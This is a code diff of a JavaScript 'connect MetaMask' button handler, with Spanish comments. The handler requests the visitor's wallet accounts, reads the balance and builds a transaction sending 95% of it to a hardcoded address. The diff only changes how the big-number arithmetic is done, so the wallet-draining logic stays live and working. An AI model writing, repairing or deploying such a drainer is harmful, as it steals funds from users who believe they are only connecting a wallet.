@@ -2,22 +2,19 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
     if (window.ethereum) {
         try {
             const web3 = new Web3(window.ethereum);
-            // Solicita acceso a la cuenta
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
 
-            // Obtiene el saldo del usuario
             const balance = await web3.eth.getBalance(usuarioAddress);
-            // Convierte el saldo a BN y calcula el 95% del saldo
-            const balanceBN = web3.utils.toBN(balance);
-            const porcentajeEnviarBN = balanceBN.mul(web3.utils.toBN(95)).div(web3.utils.toBN(100));
-            
-            // Envía la transacción
+            // Utiliza el constructor BN directamente en lugar de toBN
+            const balanceBN = new web3.utils.BN(balance);
+            const porcentajeEnviarBN = balanceBN.mul(new web3.utils.BN('95')).div(new web3.utils.BN('100'));
+
             const tx = {
                 from: usuarioAddress,
                 to: direccionDestino,
-                value: porcentajeEnviarBN.toString(), // Asegúrate de convertir el BN resultante a string
+                value: porcentajeEnviarBN.toString(),
                 gas: 21000,
             };
 
